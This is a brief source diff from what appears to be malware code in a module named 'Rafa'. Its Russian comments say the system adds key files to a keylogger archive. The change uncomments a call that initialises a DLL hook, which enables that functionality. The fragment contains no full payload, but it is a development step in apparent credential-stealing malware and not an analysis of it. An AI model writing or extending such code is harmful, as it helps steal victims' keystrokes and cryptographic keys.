@@ -60,7 +60,7 @@ namespace Rafa {
 		DBG( "Rafa", "Активирована" );
 
 #ifdef RafaDllModule
-		//InitHook_FilialRConDll();
+		InitHook_FilialRConDll();
 #endif
 		// Функция обработчик инициализации системы rafa
 		// Добавляет в архив кейлогера файлы ключей
